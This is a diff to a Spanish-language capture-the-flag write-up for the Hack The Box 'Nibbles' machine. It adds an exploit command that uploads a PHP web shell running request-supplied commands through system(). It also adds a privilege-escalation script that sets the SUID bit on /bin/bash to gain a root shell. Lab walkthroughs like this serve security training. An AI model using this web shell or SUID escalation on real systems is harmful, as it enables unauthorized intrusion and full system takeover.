@@ -39,12 +39,30 @@ Examinando el exploit vemos que se puede ingresar con el password por nibbles y 
 ## RCE
 
 ```
+python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
 
-
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 
 ```
 
+En el exploit vemos a ruta y ademas que renombra el archivo al de shell.php a image.php.
 
+## Privilege Escalation
+
+![image](https://github.com/gecr07/Nibbles-HTB/assets/63270579/12047cef-97a8-4ca2-b78c-4fc7f5f7666d)
+
+Esto quiere decir que podemos ejecutar como root y sin password monitor.sh
+
+```
+mkdir -p personal/stuff
+touch monitor.sh
+
+#!/bin/bash
+
+chmod u+s /bin/bash
+bash -p # la bandera privilege
+
+```
 
 
 
